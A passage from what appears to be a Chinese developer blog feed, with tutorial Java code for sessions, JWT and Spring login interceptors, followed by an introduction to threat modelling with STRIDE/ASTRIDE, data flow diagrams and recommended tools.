参数的方式发送给客户端。</li><li><strong>客户端发送 Session ID：</strong> 客户端在每次请求时都会将之前收到的 Session ID 发送给服务器，通常是通过 Cookie 的方式发送。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: JSESSIONID=abc123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page?JSESSIONID=abc123</span><br></pre></td></tr></table></figure><p><strong>服务器端存储 Session 数据：</strong> 服务器接收到带有 Session ID 的请求后，会根据该 ID 查找相应的 Session 数据。Session 数据通常存储在服务器内存、数据库或其他持久化存储中。</p><p><strong>Session 生命周期：</strong> Session 有一个生命周期，可以设置过期时间，通常通过 <code>maxInactiveInterval</code> 属性来定义。一旦会话超时或用户注销，Session 数据可能被销毁。</p><p><strong>Session 的安全性：</strong> 为了提高安全性，Session ID 通常需要是难以猜测的复杂字符串，并且通过 HTTPS 传输以防止中间人攻击。另外，服务器可能会实现一些安全机制，如限制每个用户的并发会话数量。</p><p><strong>分布式环境：</strong> 在分布式环境下，为了实现 Session 共享，通常会使用一些技术，如粘性会话、Session 复制、Session 集中存储等。</p><h3 id="Java代码实现过程"><a href="#Java代码实现过程" class="headerlink" title="Java代码实现过程"></a>Java代码实现过程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端生成session-key，返回给客户端保存，通常以cookie的形式将session-key返回。</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/s1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">session1</span><span class="params">(HttpSession session)</span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;HttpSession-s1: &#123;&#125;&quot;</span>, session.hashCode());</span><br><span class="line">    session.setAttribute(<span class="string">&quot;loginUser&quot;</span>, <span class="string">&quot;Jimmy&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Result.success();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端收到客户端发送的session-key，在服务端中session表进行命中并得到相应的数据进行处理。</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/s2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">session2</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">    log.info(<span class="string">&quot;HttpSession-s2: &#123;&#125;&quot;</span>, session.hashCode());</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">loginUser</span> <span class="operator">=</span> (String)session.getAttribute(<span class="string">&quot;loginUser&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;loginUser: &#123;&#125;&quot;</span>, loginUser);</span><br><span class="line">    <span class="keyword">return</span> Result.success(loginUser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>JWT 是 JSON Web Token 的缩写，是一种用于在网络上安全地传递信息的开放标准（RFC 7519）。JWT 通常用于在用户和服务器之间传递身份验证信息，以及在不同服务之间传递声明（claims）信息。</p><p>一个 JWT 由三部分组成，它们使用点号（.）分隔开来：</p><ol><li><strong>Header（头部）</strong>: 包含了两部分信息，即声明类型（”typ”）和使用的算法（”alg”）。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个头部表示该令牌使用 HMAC SHA-256 算法进行签名（”HS256”）。</p><p><strong>Payload（负载）</strong>: 包含了声明，也就是实际传输的数据，比如用户的身份信息和其他相关的声明。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;iat&quot;: 1516239022</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个负载包含了用户的主题（”sub”），名称（”name”），以及令牌的发行时间（”iat”）。</p><p><strong>Signature（签名）</strong>: 使用头部中指定的算法对头部和负载进行签名，以确保数据在传输过程中没有被篡改。</p><p>这个签名是通过使用头部中指定的算法（在这个例子中是 HMAC SHA-256）和一个秘密密钥来生成的。</p><p>将这三部分以点号连接起来，就形成了一个完整的 JWT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure><p>在实际应用中，JWT 被用于验证用户的身份、生成用户令牌、实现单点登录（SSO）等场景。服务端可以使用密钥来验证 JWT 的签名，从而确认令牌的真实性。由于 JWT 是基于 JSON 格式的，它具有轻量、易于传递和解析的特点。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//令牌生成</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGenJwt</span><span class="params">()</span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; claims = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    claims.put(<span class="string">&quot;id&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    claims.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Jimmy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">            .signWith(SignatureAlgorithm.HS256, <span class="string">&quot;Erickin&quot;</span>) <span class="comment">//签名算法</span></span><br><span class="line">            .setClaims(claims) <span class="comment">//添加负载</span></span><br><span class="line">            .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis())) <span class="comment">//设置过期时间</span></span><br><span class="line">            .compact();</span><br><span class="line">    System.out.println(jwt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//令牌解析</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testParseJwt</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiSmltbXkiLCJpZCI6MSwiZXhwIjoxNzAyOTUzNTY1fQ.daYdqZy8Qjjme_NWJDmV-9Pp5kpuxGa_W7UwdV5d0Vc&quot;</span>;</span><br><span class="line">    <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.parser()</span><br><span class="line">            .setSigningKey(<span class="string">&quot;Erickin&quot;</span>)</span><br><span class="line">            .parseClaimsJws(temp)</span><br><span class="line">            .getBody();</span><br><span class="line">    System.out.println(claims);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Filter-Interceptor过滤器"><a href="#Filter-Interceptor过滤器" class="headerlink" title="Filter &amp; Interceptor过滤器"></a>Filter &amp; Interceptor过滤器</h1><p> 将前端对后端的请求进行拦截，从而实现相应的功能，比如登录校验、统一编码处理、敏感字符处理等；</p><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><p><strong>1.实现Filter接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.erickin.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过这个注解指定哪个api接口将会被拦截过滤</span></span><br><span class="line"><span class="comment">//implements Filter: 实现Filter接口</span></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;DemoFilter.init已执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;DemoFilter拦截到了请求.....放行前逻辑&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;DemoFilter拦截到了请求.....放行后逻辑&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;DemoFilter.destory已执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2.配置注解</strong></p><ul><li><p><code>WebFilter(urlPatterns=&quot;/*&quot;)</code>: 加在filter实现类上；</p><blockquote><table><thead><tr><th>拦截路径</th><th>urlPatterns值</th><th>含义</th></tr></thead><tbody><tr><td>拦截具体路径</td><td>&#x2F;login</td><td>只有访问&#x2F;login路径时，才会被拦截</td></tr><tr><td>目录拦截</td><td>&#x2F;emps&#x2F;*</td><td>访问&#x2F;emps下的所有资源，都会被拦截</td></tr><tr><td>拦截所有</td><td>&#x2F;*</td><td>访问所有资源，都会被拦截</td></tr></tbody></table></blockquote></li><li><p><code>ServletComponentScan</code>: 加在Application启动类上；</p></li></ul><h3 id="过滤器链"><a href="#过滤器链" class="headerlink" title="过滤器链"></a>过滤器链</h3><ul><li>一个web应用中，可以配置多个过滤器，这多个过滤器就形成了一个过滤器链；</li><li>注解配置的filter，优先级按照过滤器类名（字符串）的自然排序，比如abcFilter会在demoFilter之前执行，到应用程序执行后，会按顺序依次推出过滤器链执行后逻辑。</li></ul><h2 id="Interceptor"><a href="#Interceptor" class="headerlink" title="Interceptor"></a>Interceptor</h2><h3 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h3><p><strong>1.创建HandlerInterceptor接口的实现类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.erickin.Interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.erickin.Util.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.erickin.pojo.Result;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginCheckInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    JwtUtils jwtUtils;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURL().toString();</span><br><span class="line">        log.info(<span class="string">&quot;请求的url: &#123;&#125;&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(url.contains(<span class="string">&quot;login&quot;</span>))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;登录操作，放行...&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jwt</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!StringUtils.hasLength(jwt))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;请求头token为空，返回未登录信息&quot;</span>);</span><br><span class="line">            <span class="type">Result</span> <span class="variable">error</span> <span class="operator">=</span> Result.error(<span class="string">&quot;NOT_LOGIN&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">notlogin</span> <span class="operator">=</span> JSONObject.toJSONString(error);</span><br><span class="line">            response.getWriter().write(notlogin);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jwtUtils.parseJwt(jwt);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            log.info(<span class="string">&quot;解析令牌失败，返回未登录错误信息&quot;</span>);</span><br><span class="line">            <span class="type">Result</span> <span class="variable">error</span> <span class="operator">=</span> Result.error(<span class="string">&quot;NOT_LOGIN&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">notlogin</span> <span class="operator">=</span> JSONObject.toJSONString(error);</span><br><span class="line">            response.getWriter().write(notlogin);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;令牌合法，放行&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;postHandle......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;afterCompletion......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别实现三个方法：</p><ul><li>preHandle：拦截前方法；</li><li>postHandle：拦截后方法；</li><li>afterCompletion：最终方法。</li></ul><p>一般在拦截前和拦截后方法中实现逻辑。</p><p><strong>2.创建配置类（WebMvcConfigurer实现类）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.erickin.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.erickin.Interceptor.LoginCheckInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.sun.deploy.util.WinRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginCheckInterceptor loginCheckInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(loginCheckInterceptor).addPathPatterns(<span class="string">&quot;/**&quot;</span>).excludePathPatterns(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在方法中，分别指定过滤路径和白名单路径。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;回调函数&quot;&gt;&lt;a href=&quot;#回调函数&quot; class=&quot;headerlink&quot; title=&quot;回调函数&quot;&gt;&lt;/a&gt;回调函数&lt;/h1&gt;&lt;p&gt;回调函数（Callback Function）是一种作为参数传递给其他函数的函数。</summary>
      
    
    
    
    <category term="开发" scheme="https://erickinyae.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Java" scheme="https://erickinyae.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>威胁建模</title>
    <link href="https://erickinyae.github.io/2023/11/20/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"/>
    <id>https://erickinyae.github.io/2023/11/20/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/</id>
    <published>2023-11-20T01:22:37.000Z</published>
    <updated>2024-03-06T10:09:05.203Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Note by Eric.</p></blockquote><blockquote><p>如何做好威胁就建模：<a href="https://tech.meituan.com/2021/04/08/threat-modeling-security.html">https://tech.meituan.com/2021/04/08/threat-modeling-security.html</a></p><p>安全架构评审实战：<a href="https://mp.weixin.qq.com/s/YQn1FQICk1esxvBCHZntFA">https://mp.weixin.qq.com/s/YQn1FQICk1esxvBCHZntFA</a></p><p>威胁建模图例：<a href="https://zhuanlan.zhihu.com/p/73205112">https://zhuanlan.zhihu.com/p/73205112</a></p><p>微软威胁建模教程：<a href="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/1-introduction">https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/1-introduction</a></p></blockquote><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><table><thead><tr><th>工具</th><th>教程</th></tr></thead><tbody><tr><td>Microsoft Threat Modeling</td><td><a href="https://learn.microsoft.com/zh-cn/azure/security/develop/threat-modeling-tool-feature-overview">https://learn.microsoft.com/zh-cn/azure/security/develop/threat-modeling-tool-feature-overview</a></td></tr></tbody></table><h1 id="安全需求"><a href="#安全需求" class="headerlink" title="安全需求"></a>安全需求</h1><table><thead><tr><th>安全需求</th></tr></thead><tbody><tr><td>OWASP ASVS</td></tr></tbody></table><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>威胁建模实践使开发团队可以在计划的运行环境的背景下，以结构化的方式思考、记录并讨论系统设计的安全影响。威胁建模是帮助保护系统、应用程序、网络和服务的有效方法。这是一种工程技术，用于识别潜在的威胁和建议，以帮助降低风险并在<strong>开发生命周期的早期实现安全目标。</strong></p><p>在业内也有STRIDE、Trike、OCTAVE等多种方法论实践。</p><p>在研发团队的安全例行活动中，对于一些拥有重要数据资产、安全事件影响力大的系统除了要进行常规的渗透测试、黑白盒代码扫描之外，更应该系统地定期开展威胁建模活动并对业务赋能。</p><ul><li>威胁是应用潜在存在的安全弱点。</li><li>漏洞是对威胁的利用，产品实现了预期之前的功能，影响了安全性。</li><li>Bug是未实现的功能。</li><li>风险是发生的，对资产有危害的可能性。</li><li>风险&#x3D;（威胁+漏洞）*可能性。</li></ul><h1 id="威胁建模的价值"><a href="#威胁建模的价值" class="headerlink" title="威胁建模的价值"></a>威胁建模的价值</h1><ul><li><strong>识别体系化的结构缺陷</strong>：大多数安全问题是设计缺陷问题，而不是安全性错误。威胁建模能帮助识别这些设计缺陷，从而减少风险敞口，指导安全测试，并降低因安全漏洞而造成的品牌损害或财务损失等可能性。</li><li><strong>节约组织安全成本</strong>：通过对威胁进行建模，并在设计阶段建立安全性需求，降低安全设计缺陷导致的修复成本。在需求管理和威胁分析阶段，与业务开发团队高效互动，释放安全团队的专业能力，专注于高性价比的安全建设。</li><li><strong>落地DevSecOps文化</strong>：通过威胁建模跑通开发和安全工具的流程集成，把风险管理嵌入产品的完整生命周期，从而推动形成完整的DevSecOps工具链。</li><li><strong>满足合规要求</strong>：威胁建模是国际安全行业通用的方法论，通过向管理层和监管机构提供产品的风险管理活动的完整记录，帮助团队遵守全球法律法规要求，包括PCI DSS、GDPR、HIPAA、CSA STAR等。</li></ul><p>威胁建模的阶段性成果交付物会是不同形式，如安全白皮书、安全设计指导、威胁评估报告。业务团队可以从安全给出的长期修复方案和安全规划中获益。最终报告最好有安全团队内部双人复核机制，不同安全专家视角里对威胁的理解是不一样的，双人复核的另一个好处是可以减少工作量，比如分工区分A-管理端、B-Agent、A-代码、B-设计实现或者A-评审、B-复查分工。给出威胁建模结果前一定要同业务团队再次 沟通，确认哪些风险是安全视角被错误理解的，哪些是已经在业务视野中，哪些是业务团队认知不到位的。修复方案要区分接受、缓解、转移、处理风险四种情况。沟通时对应报告每个威胁项要求业务方给出明确的排期。短期可以走安全工单，长期纳入业务的规划排期中，识别出的共性安全问题作为安全专项制定孵化相应的安全工具和项目，补全安全建设的蓝图。</p><h1 id="威胁建模实施"><a href="#威胁建模实施" class="headerlink" title="威胁建模实施"></a>威胁建模实施</h1><p>绘制数据流图，识别定义威胁、处置威胁、验证风险得到正确处理是威胁建模的四个常用步骤。</p><p>为什么我们需要建模？因为实施威胁建模时往往系统并未完整构建（无代码或代码不完整），模型会帮助思考系统的设计，以攻击者和防守方的方式思考对应的安全威胁。</p><p>使用威胁建模工具、审查数据流图、威胁模型的目标都是为了达成更充分讨论的目的而服务。</p><p>安全团队基于业务的流程图、调用关系同业务一起绘制DFD数据流图（业务现有文档中的时序图、UML图辅助理解复杂问题和技术细节）；</p><p>绘制DFD的工具：</p><ul><li>微软的Microsoft Threat Modeling Tool工具的优点是，适合初学者接触熟悉了解外部实体、数据流、过程、存储、信任边界的基本概念，缺点是除了Windows应用程序和Azure示例之外没有合适的威胁模板。</li><li>OWASP Threat Dragon的优点是表达方式更丰富，但是不能支持动态拖拽和自动导出威胁列表。大家没有必要将整理数据流图视为困难，实战中威胁建模能力只能通过多练习、反复挑战的方法熟悉技能。</li></ul><p>识别威胁</p><p><strong>第一步是灵活定义攻击者的目标，组织要保护的资产和信任级别</strong>，如：S3存储、源代码、主机、数据库、凭据、行级数据，知识产权等。公有云、私有云不同的责任共担模型就清晰给出了不同的业务需要关注哪些资产的示例，云上资产的建模更关注安全的信任边界。</p><p><strong>第二步给出明确的攻击路径，定义攻击者</strong>：比如恶意内部员工、外部攻击者，竞争对手、好奇者等，攻击路径的抉择直接影响攻击面和信任边界的划定。</p><p><strong>第三步即威胁评估的过程不能缺少架构分类思维</strong>。一般使用 ASTRIDE（隐私、欺骗、篡改、信息泄露、否认性、拒绝服务和特权提升）和攻击树模型作为常用的威胁建模技术指导原则。</p><h1 id="威胁建模理论模型-ASTRIDE"><a href="#威胁建模理论模型-ASTRIDE" class="headerlink" title="威胁建模理论模型 - ASTRIDE"></a>威胁建模理论模型 - ASTRIDE</h1><table><thead><tr><th>威胁</th><th>安全属性</th><th>定义</th><th>举例</th></tr></thead><tbody><tr><td>隐私(Privacy)</td><td>隐私保护</td><td>用户信息防护</td><td>用户隐私被查阅</td></tr><tr><td>仿冒(Spooling)</td><td>认证</td><td>冒充人和物</td><td>冒充其他用户、服务账号</td></tr><tr><td>篡改(Tampering)</td><td>完整性</td><td>修改数据或代码</td><td>修改存储的信息</td></tr><tr><td>抵赖(Repudiation)</td><td>审计</td><td>不承认做过的行为</td><td>日志、审计</td></tr><tr><td>信息泄露(Information Disclosure)</td><td>保密性</td><td>信息被泄露或窃取</td><td>数据库信息被泄露</td></tr><tr><td>拒绝服务(Dos)</td><td>可用性</td><td>消耗资源、服务不可用</td><td>高危操作导致不可用</td></tr><tr><td>权限提升(Elevation of 